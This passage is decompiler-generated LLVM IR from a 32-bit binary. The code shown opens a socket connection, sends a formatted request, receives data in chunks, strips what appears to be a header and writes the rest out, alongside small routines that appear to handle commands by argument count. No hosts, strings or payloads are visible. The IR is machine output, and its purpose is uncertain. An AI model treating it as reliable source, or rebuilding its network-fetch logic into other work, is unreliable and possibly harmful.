  %v3_8f64 = call i32 @function_ed20(i32 %v2_8f58, i8* %v2_8f64)
  br label %dec_label_pc_8f98

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f04
  %v4_8f78 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f7c = add i32 %v4_8f78, 4
  %v1_8f80 = inttoptr i32 %v1_8f7c to i32*
  %v2_8f80 = load i32, i32* %v1_8f80, align 4
  %v2_8f88 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_8f80, i32* %r1.global-to-local, align 4
  %v2_8f94 = inttoptr i32 %v2_8f80 to i8*
  %v3_8f94 = call i32 @function_ed20(i32 %v2_8f88, i8* %v2_8f94)
  br label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f38, %dec_label_pc_8f6c
  %v2_8fb8.pre-phi = phi i32 [ %v2_8f58, %dec_label_pc_8f38 ], [ %v2_8f88, %dec_label_pc_8f6c ]
  br label %dec_label_pc_8fb0

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8fd0
  %v1_8fa8 = add i32 %storemerge5, 1
  br label %dec_label_pc_8fb0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8fa4
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8f98 ], [ %v1_8fa8, %dec_label_pc_8fa4 ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v0_8fc0 = call i32 @function_ecc0()
  %v0_8fc8 = load i32, i32* @r4, align 4
  %v3_8fc8 = icmp ult i32 %v0_8fc8, %v0_8fc0
  br i1 %v3_8fc8, label %dec_label_pc_8fd0, label %dec_label_pc_8ff4

dec_label_pc_8fd0:                                ; preds = %dec_label_pc_8fb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_8fe0 = add i32 %storemerge5, %v16_8df8
  %v2_8fe4 = add i32 %v2_8fe0, -1084
  %v1_8fe8 = inttoptr i32 %v2_8fe4 to i8*
  %v2_8fe8 = load i8, i8* %v1_8fe8, align 1
  %v7_8fec = icmp eq i8 %v2_8fe8, 47
  br i1 %v7_8fec, label %dec_label_pc_8ff4, label %dec_label_pc_8fa4

dec_label_pc_8ff4:                                ; preds = %dec_label_pc_8fb0, %dec_label_pc_8fd0
  %v2_9004 = add i32 %v16_8df8, -1084
  %v2_9008 = add i32 %v2_9004, %storemerge5
  %v3_9010 = inttoptr i32 %v2_9008 to i8*
  store i8 0, i8* %v3_9010, align 1
  store i32 2, i32* %stack_var_-80, align 4
  %v1_9028 = call i32 @function_f294(i32 80)
  store i32 %v2_8fb8.pre-phi, i32* @r0, align 4
  %v1_9048 = call i32 @function_f3c0(i32 %v2_8fb8.pre-phi)
  %v3_9058 = icmp eq i32 %v1_9048, -1
  br i1 %v3_9058, label %dec_label_pc_9060, label %dec_label_pc_90e0

dec_label_pc_9060:                                ; preds = %dec_label_pc_8ff4
  %v1_906c = call i32 @function_f3e4(i32 %v2_8fb8.pre-phi)
  %v2_907c = icmp eq i32 %v1_906c, 0
  br i1 %v2_907c, label %dec_label_pc_9084, label %dec_label_pc_90b4

dec_label_pc_9084:                                ; preds = %dec_label_pc_9060
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_9098 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_15830.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_90a8 = call i32 @function_8374(i32 %v4_9098, i32 ptrtoint ([39 x i8]* @global_var_15830.51 to i32))
  %v1_90b0 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_90b4

dec_label_pc_90b4:                                ; preds = %dec_label_pc_9060, %dec_label_pc_9084
  %v2_90b8 = ptrtoint i32* %stack_var_-76 to i32
  %v1_90c0 = add i32 %v1_906c, 16
  %v2_90c0 = inttoptr i32 %v1_90c0 to i32*
  %v3_90c0 = load i32, i32* %v2_90c0, align 4
  %v1_90c4 = inttoptr i32 %v3_90c0 to i32*
  %v2_90c4 = load i32, i32* %v1_90c4, align 4
  store i32 %v2_90c4, i32* @r1, align 4
  %v1_90cc = add i32 %v1_906c, 12
  %v2_90cc = inttoptr i32 %v1_90cc to i32*
  %v3_90cc = load i32, i32* %v2_90cc, align 4
  store i32 %v2_90b8, i32* @r0, align 4
  store i32 %v3_90cc, i32* @r2, align 4
  %v0_90d8 = call i32 @function_ec10()
  br label %dec_label_pc_90e8

dec_label_pc_90e0:                                ; preds = %dec_label_pc_8ff4
  store i32 %v1_9048, i32* %stack_var_-76, align 4
  br label %dec_label_pc_90e8

dec_label_pc_90e8:                                ; preds = %dec_label_pc_90b4, %dec_label_pc_90e0
  %v2_90e8.pre-phi = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_90e8.pre-phi, i32* %r1.global-to-local, align 4
  %v3_9110 = bitcast i32* %stack_var_-80 to %sockaddr*
  %v4_9110 = call i32 @function_f7f4(i32 %v3_8ebc, %sockaddr* %v3_9110, i32 16)
  %v2_9118 = icmp eq i32 %v4_9110, 0
  br i1 %v2_9118, label %dec_label_pc_9150, label %dec_label_pc_9120

dec_label_pc_9120:                                ; preds = %dec_label_pc_90e8
  %v4_9134 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_15858.53 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9144 = call i32 @function_8374(i32 %v4_9134, i32 ptrtoint ([39 x i8]* @global_var_15858.53 to i32))
  %v1_914c = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_90e8, %dec_label_pc_9120
  %v2_9160 = add i32 %v2_8fb8.pre-phi, 1
  %v1_9164 = add i32 %v2_9160, %storemerge5
  store i32 %v1_9164, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_15880.55 to i32), i32* %r1.global-to-local, align 4
  %v3_9178 = call i32 @function_8374(i32 %v3_8ebc, i32 ptrtoint ([276 x i8]* @global_var_15880.55 to i32))
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_9190 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([28 x i8]* @global_var_15994.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91a0 = call i32 @function_8374(i32 %v4_9190, i32 ptrtoint ([28 x i8]* @global_var_15994.57 to i32))
  %v4_91b0 = load i32, i32* %stack_var_-5216, align 4
  %v1_91b4 = add i32 %v4_91b0, 8
  %v1_91b8 = inttoptr i32 %v1_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.59 to i32), i32* @r1, align 4
  %v3_91c4 = call i32 @function_cd94(i32 %v2_91b8, i32 ptrtoint ([3 x i8]* @global_var_159b0.59 to i32))
  %v2_91d8 = ptrtoint i32* %stack_var_-5200 to i32
  %v2_9228 = add i32 %v16_8df8, -5180
  br label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %dec_label_pc_9364, %dec_label_pc_9150
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_91ec = call i32 @function_f84c(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp56 = icmp slt i32 %v5_91ec, 1
  br i1 %tmp56, label %dec_label_pc_9384.loopexit9, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91d0
  %v8_9214 = icmp sgt i32 %v5_91ec, 4095
  br i1 %v8_9214, label %dec_label_pc_9244.lr.ph, label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %dec_label_pc_9204
  %v2_922c = add i32 %v5_91ec, %v2_9228
  %v3_9234 = inttoptr i32 %v2_922c to i8*
  store i8 0, i8* %v3_9234, align 1
  br label %dec_label_pc_9244.lr.ph

dec_label_pc_9244.lr.ph:                          ; preds = %dec_label_pc_9218, %dec_label_pc_9204
  br label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9244.lr.ph, %dec_label_pc_9364
  %storemerge691 = phi i32 [ 0, %dec_label_pc_9244.lr.ph ], [ %v1_9368, %dec_label_pc_9364 ]
  %v2_9258 = add i32 %storemerge691, %v2_91d8
  store i32 ptrtoint ([5 x i8]* @global_var_159b4.61 to i32), i32* @r1, align 4
  %v4_9268 = inttoptr i32 %v2_9258 to i8*
  %v5_9268 = call i32 @function_ed3c(i8* %v4_9268, i32 ptrtoint ([5 x i8]* @global_var_159b4.61 to i32), i32 4)
  %v2_9270 = icmp eq i32 %v5_9268, 0
  br i1 %v2_9270, label %dec_label_pc_9278, label %dec_label_pc_9364

dec_label_pc_9278:                                ; preds = %dec_label_pc_9244
  %v1_927c = add i32 %storemerge691, 4
  %v1_9294 = add i32 %v3_91c4, 52
  %v2_9294 = inttoptr i32 %v1_9294 to i32*
  %v1_92a4 = add i32 %v3_91c4, 16
  %v2_92a4 = inttoptr i32 %v1_92a4 to i32*
  %v1_92ac = add i32 %v3_91c4, 28
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v5_935c80 = icmp slt i32 %v1_927c, %v5_91ec
  br i1 %v5_935c80, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9288:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344
  %storemerge781 = phi i32 [ %v1_9348, %dec_label_pc_9344 ], [ %v1_927c, %dec_label_pc_9278 ]
  %v3_9294 = load i32, i32* %v2_9294, align 4
  %v2_9298 = icmp eq i32 %v3_9294, 0
  br i1 %v2_9298, label %dec_label_pc_931c, label %dec_label_pc_92a0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_9288
  %v3_92a4 = load i32, i32* %v2_92a4, align 4
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v3_92b0 = icmp ult i32 %v3_92a4, %v3_92ac
  br i1 %v3_92b0, label %dec_label_pc_92b8, label %dec_label_pc_92f0

dec_label_pc_92b8:                                ; preds = %dec_label_pc_92a0
  %v3_92bc = load i32, i32* %v2_92a4, align 4
  store i32 %v3_92bc, i32* %r1.global-to-local, align 4
  %v2_92d0 = add i32 %storemerge781, %v16_8df8
  %v2_92d4 = add i32 %v2_92d0, -5180
  %v1_92d8 = inttoptr i32 %v2_92d4 to i8*
  %v2_92d8 = load i8, i8* %v1_92d8, align 1
  %v3_92dc = inttoptr i32 %v3_92bc to i8*
  store i8 %v2_92d8, i8* %v3_92dc, align 1
  %v0_92e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_92e0 = add i32 %v0_92e0, 1
  store i32 %v1_92e0, i32* %v2_92a4, align 4
  br label %dec_label_pc_9344

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92a0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_9300 = add i32 %storemerge781, %v16_8df8
  %v2_9304 = add i32 %v2_9300, -5180
  %v1_9308 = inttoptr i32 %v2_9304 to i8*
  %v2_9308 = load i8, i8* %v1_9308, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9314 = call i32 @function_ea1c(i8 %v2_9308, i32 %v3_91c4, i32 %v2_9300)
  br label %dec_label_pc_9344

dec_label_pc_931c:                                ; preds = %dec_label_pc_9288
  %v2_932c = add i32 %storemerge781, %v16_8df8
  %v2_9330 = add i32 %v2_932c, -5180
  %v1_9334 = inttoptr i32 %v2_9330 to i8*
  %v2_9334 = load i8, i8* %v1_9334, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_9340 = call i32 @function_e594(i8 %v2_9334, i32 %v3_91c4, i32 %v2_932c)
  br label %dec_label_pc_9344

dec_label_pc_9344:                                ; preds = %dec_label_pc_92f0, %dec_label_pc_92b8, %dec_label_pc_931c
  %v1_9348 = add i32 %storemerge781, 1
  %v5_935c = icmp slt i32 %v1_9348, %v5_91ec
  br i1 %v5_935c, label %dec_label_pc_9288, label %dec_label_pc_9384

dec_label_pc_9364:                                ; preds = %dec_label_pc_9244
  %v1_9368 = add nuw nsw i32 %storemerge691, 1
  %v5_937c = icmp slt i32 %v1_9368, %v5_91ec
  br i1 %v5_937c, label %dec_label_pc_9244, label %dec_label_pc_91d0

dec_label_pc_9384.loopexit9:                      ; preds = %dec_label_pc_91d0
  %.pre17 = add i32 %v3_91c4, 52
  %.pre18 = inttoptr i32 %.pre17 to i32*
  %.pre19 = add i32 %v3_91c4, 16
  %.pre20 = inttoptr i32 %.pre19 to i32*
  %.pre21 = add i32 %v3_91c4, 28
  %.pre22 = inttoptr i32 %.pre21 to i32*
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9278, %dec_label_pc_9344, %dec_label_pc_9384.loopexit9
  %v2_9460.pre-phi = phi i32* [ %.pre22, %dec_label_pc_9384.loopexit9 ], [ %v2_92ac, %dec_label_pc_9344 ], [ %v2_92ac, %dec_label_pc_9278 ]
  %v2_9458.pre-phi = phi i32* [ %.pre20, %dec_label_pc_9384.loopexit9 ], [ %v2_92a4, %dec_label_pc_9344 ], [ %v2_92a4, %dec_label_pc_9278 ]
  %v2_9448.pre-phi = phi i32* [ %.pre18, %dec_label_pc_9384.loopexit9 ], [ %v2_9294, %dec_label_pc_9344 ], [ %v2_9294, %dec_label_pc_9278 ]
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_93b0 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_159bc.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_93c4 = call i32 @function_8374(i32 %v4_93b0, i32 ptrtoint ([24 x i8]* @global_var_159bc.63 to i32))
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %dec_label_pc_94f8, %dec_label_pc_9384
  store i32 %v2_91d8, i32* %r1.global-to-local, align 4
  %v5_93e4 = call i32 @function_f84c(i32 %v3_8ebc, i32* nonnull %stack_var_-5200, i32 4096, i32 0)
  %tmp58 = icmp slt i32 %v5_93e4, 1
  br i1 %tmp58, label %dec_label_pc_9518, label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93c8
  %v8_940c = icmp sgt i32 %v5_93e4, 4095
  br i1 %v8_940c, label %dec_label_pc_943c.lr.ph, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_93fc
  %v2_9424 = add i32 %v5_93e4, %v2_9228
  %v3_942c = inttoptr i32 %v2_9424 to i8*
  store i8 0, i8* %v3_942c, align 1
  br label %dec_label_pc_943c.lr.ph

dec_label_pc_943c.lr.ph:                          ; preds = %dec_label_pc_9410, %dec_label_pc_93fc
  br label %dec_label_pc_943c

dec_label_pc_943c:                                ; preds = %dec_label_pc_943c.lr.ph, %dec_label_pc_94f8
  %storemerge871 = phi i32 [ 0, %dec_label_pc_943c.lr.ph ], [ %v1_94fc, %dec_label_pc_94f8 ]
  %v3_9448 = load i32, i32* %v2_9448.pre-phi, align 4
  %v2_944c = icmp eq i32 %v3_9448, 0
  br i1 %v2_944c, label %dec_label_pc_94d0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_943c
  %v3_9458 = load i32, i32* %v2_9458.pre-phi, align 4
  %v3_9460 = load i32, i32* %v2_9460.pre-phi, align 4
  %v3_9464 = icmp ult i32 %v3_9458, %v3_9460
  br i1 %v3_9464, label %dec_label_pc_946c, label %dec_label_pc_94a4

dec_label_pc_946c:                                ; preds = %dec_label_pc_9454
  %v3_9470 = load i32, i32* %v2_9458.pre-phi, align 4
  store i32 %v3_9470, i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  %v2_9484 = add i32 %storemerge871, %v16_8df8
  %v2_9488 = add i32 %v2_9484, -5180
  %v1_948c = inttoptr i32 %v2_9488 to i8*
  %v2_948c = load i8, i8* %v1_948c, align 1
  %v3_9490 = inttoptr i32 %v3_9470 to i8*
  store i8 %v2_948c, i8* %v3_9490, align 1
  %v0_9494 = load i32, i32* %r1.global-to-local, align 4
  %v1_9494 = add i32 %v0_9494, 1
  store i32 %v1_9494, i32* %v2_9458.pre-phi, align 4
  br label %dec_label_pc_94f8

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9454
  %v2_94b4 = add i32 %storemerge871, %v16_8df8
  %v2_94b8 = add i32 %v2_94b4, -5180
  %v1_94bc = inttoptr i32 %v2_94b8 to i8*
  %v2_94bc = load i8, i8* %v1_94bc, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94c8 = call i32 @function_ea1c(i8 %v2_94bc, i32 %v3_91c4, i32 %v2_94b4)
  br label %dec_label_pc_94f8

dec_label_pc_94d0:                                ; preds = %dec_label_pc_943c
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v2_94e0 = add i32 %storemerge871, %v16_8df8
  %v2_94e4 = add i32 %v2_94e0, -5180
  %v1_94e8 = inttoptr i32 %v2_94e4 to i8*
  %v2_94e8 = load i8, i8* %v1_94e8, align 1
  store i32 %v3_91c4, i32* %r1.global-to-local, align 4
  %v4_94f4 = call i32 @function_e594(i8 %v2_94e8, i32 %v3_91c4, i32 %v2_94e0)
  br label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94a4, %dec_label_pc_946c, %dec_label_pc_94d0
  %v1_94fc = add nuw nsw i32 %storemerge871, 1
  %v5_9510 = icmp slt i32 %v1_94fc, %v5_93e4
  br i1 %v5_9510, label %dec_label_pc_943c, label %dec_label_pc_93c8

dec_label_pc_9518:                                ; preds = %dec_label_pc_93c8
  %v1_951c = inttoptr i32 %v3_91c4 to i8*
  %v2_951c = call i32 @function_cc14(i8* %v1_951c)
  %v1_9524 = call i32 @function_ca18(i32 %v3_8ebc)
  %v1_952c = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9530

dec_label_pc_9530:                                ; preds = %dec_label_pc_8df4, %dec_label_pc_9518
  %v12_9534 = phi i32 [ %v1_8e58, %dec_label_pc_8df4 ], [ %v1_952c, %dec_label_pc_9518 ]
  ret i32 %v12_9534

; uselistorder directives
  uselistorder i32 %storemerge871, { 0, 3, 2, 1 }
  uselistorder i32 %v5_93e4, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9458.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_9348, { 1, 0 }
  uselistorder i32 %storemerge781, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge691, { 1, 0, 2 }
  uselistorder i32 %v5_91ec, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_91d8, { 1, 0, 2 }
  uselistorder i32 %v3_91c4, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8fb8.pre-phi, { 0, 4, 2, 3, 1 }
  uselistorder i32* %v4_8e14, { 2, 3, 1, 4, 5, 0, 6 }
  uselistorder i32 %v16_8df8, { 0, 14, 1, 2, 13, 15, 16, 3, 4, 12, 5, 7, 17, 11, 18, 8, 6, 10, 19, 20, 9, 21, 22, 23 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 -5180, { 4, 5, 6, 1, 2, 3, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 (i8*, i32, i32)* @function_ed3c, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_9530, { 1, 0 }
  uselistorder label %dec_label_pc_94f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_943c, { 1, 0 }
  uselistorder label %dec_label_pc_9384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9288, { 1, 0 }
  uselistorder label %dec_label_pc_9244, { 1, 0 }
  uselistorder label %dec_label_pc_9150, { 1, 0 }
  uselistorder label %dec_label_pc_90e8, { 1, 0 }
  uselistorder label %dec_label_pc_90b4, { 1, 0 }
  uselistorder label %dec_label_pc_8ff4, { 1, 0 }
  uselistorder label %dec_label_pc_8fb0, { 1, 0 }
  uselistorder label %dec_label_pc_8f98, { 1, 0 }
  uselistorder label %dec_label_pc_8f04, { 1, 0 }
  uselistorder label %dec_label_pc_8eb0, { 1, 0 }
}

define i32 @function_9560(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9560:
  %tmp25 = call i8 @__decompiler_undefined_function_2()
  %tmp26 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  store i32 38252, i32* %stack_var_-4, align 4
  %v2_9568 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9568, i32* @fp, align 4
  %v2_9590 = load i32, i32* @global_var_1847c.35, align 4
  %v7_95b0 = icmp eq i32 %v2_9590, 1
  br i1 %v7_95b0, label %dec_label_pc_95b8, label %dec_label_pc_9614

dec_label_pc_95b8:                                ; preds = %dec_label_pc_9560
  store i32 %arg2, i32* @r2, align 4
  %v3_960c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_159d4.67 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_9614:                                ; preds = %dec_label_pc_9560
  %v2_9584 = load i8*, i8** @global_var_18478.33, align 4
  %v3_9584 = ptrtoint i8* %v2_9584 to i32
  store i32 %v3_9584, i32* @lr, align 4
  %v3_9658 = sext i8 %tmp26 to i32
  store i32 %v3_9658, i32* @r4, align 4
  %v3_9668 = sext i8 %tmp25 to i32
  store i32 %v3_9668, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96b4 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_159f4.69 to i32))
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_95b8, %dec_label_pc_9614
  %storemerge = phi i32 [ %v3_96b4, %dec_label_pc_9614 ], [ %v3_960c, %dec_label_pc_95b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @function_96d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96d0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38620, i32* %stack_var_-4, align 4
  %v2_96d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_96d8, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_15a24.71 to i32))
  ret i32 %v3_96fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_970c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_970c:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38680, i32* %stack_var_-4, align 4
  %v2_9714 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9714, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_9730 = icmp eq i32 %arg3, 1
  br i1 %v7_9730, label %dec_label_pc_974c, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  store i32 %arg2, i32* @r2, align 4
  %v3_9744 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_15a44.73 to i32))
  br label %dec_label_pc_979c

dec_label_pc_974c:                                ; preds = %dec_label_pc_970c
  %v1_9750 = add i32 %arg4, 4
  %v1_9754 = inttoptr i32 %v1_9750 to i32*
  %v2_9754 = load i32, i32* %v1_9754, align 4
  store i32 %v2_9754, i32* @r0, align 4
  %v0_975c = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_975c, 10
  br i1 %tmp, label %dec_label_pc_9780, label %dec_label_pc_976c

dec_label_pc_976c:                                ; preds = %dec_label_pc_974c
  store i32 %arg2, i32* @r2, align 4
  %v3_9778 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_15a5c.75 to i32))
  br label %dec_label_pc_979c

dec_label_pc_9780:                                ; preds = %dec_label_pc_974c
  %v3_9780 = load i32, i32* %stack_var_-32, align 4
  %v1_9784 = add i32 %v3_9780, 4
  %v1_9788 = inttoptr i32 %v1_9784 to i32*
  %v2_9788 = load i32, i32* %v1_9788, align 4
  store i32 %v2_9788, i32* @r2, align 4
  %v3_9798 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_15a94.77 to i32))
  br label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_976c, %dec_label_pc_9738, %dec_label_pc_9780
  %v9_97a0 = phi i32 [ %v3_9778, %dec_label_pc_976c ], [ %v3_9744, %dec_label_pc_9738 ], [ %v3_9798, %dec_label_pc_9780 ]
  ret i32 %v9_97a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_979c, { 2, 0, 1 }
}

define i32 @function_97b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97b0:
  %stack_var_-4 = alloca i32, align 4
  store i32 38844, i32* %stack_var_-4, align 4
  %v2_97b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97b8, i32* @fp, align 4
  %v7_97d4 = icmp eq i32 %arg3, 1
  br i1 %v7_97d4, label %dec_label_pc_9828, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_97b0
  store i32 %arg2, i32* @r2, align 4
  %v3_97e8 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_15aa0.79 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9820 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15ae4.86 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9828:                                ; preds = %dec_label_pc_97b0
  %v2_982c = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  %v2_9830 = icmp eq i8 %v2_982c, 0
  br i1 %v2_9830, label %dec_label_pc_984c, label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9828
  store i32 %arg2, i32* @r2, align 4
  %v3_9844 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_15b08.88 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_984c:                                ; preds = %dec_label_pc_9828
  %v1_9850 = add i32 %arg4, 4
  %v1_9854 = inttoptr i32 %v1_9850 to i32*
  %v2_9854 = load i32, i32* %v1_9854, align 4
  store i32 %v2_9854, i32* @r0, align 4
  %v0_985c = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_985c, 255
  br i1 %tmp, label %dec_label_pc_9880, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_984c
  store i32 %arg2, i32* @r2, align 4
  %v3_9878 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_15b28.90 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_9880:                                ; preds = %dec_label_pc_984c
  store i8 1, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_989c = call i32 @function_ec20(i8* bitcast (i32* @global_var_1aaf0.92 to i8*), i32 0)
  %v2_98a8 = load i32, i32* %v1_9854, align 4
  %v2_98b4 = inttoptr i32 %v2_98a8 to i8*
  %v3_98b4 = call i32 @function_ed20(i32 ptrtoint (i32* @global_var_1aaf0.92 to i32), i8* %v2_98b4)
  %v3_98c0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_15b50.94 to i32))
  br label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_986c, %dec_label_pc_9838, %dec_label_pc_97dc, %dec_label_pc_9880
  %v9_98c8 = phi i32 [ %v3_9878, %dec_label_pc_986c ], [ %v3_9844, %dec_label_pc_9838 ], [ %v3_9820, %dec_label_pc_97dc ], [ %v3_98c0, %dec_label_pc_9880 ]
  ret i32 %v9_98c8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_98c4, { 3, 0, 1, 2 }
}

define i32 @function_98f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98f0:
  %stack_var_-4 = alloca i32, align 4
  store i32 39164, i32* %stack_var_-4, align 4
  %v2_98f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98f8, i32* @fp, align 4
  %v7_9914 = icmp eq i32 %arg3, 1
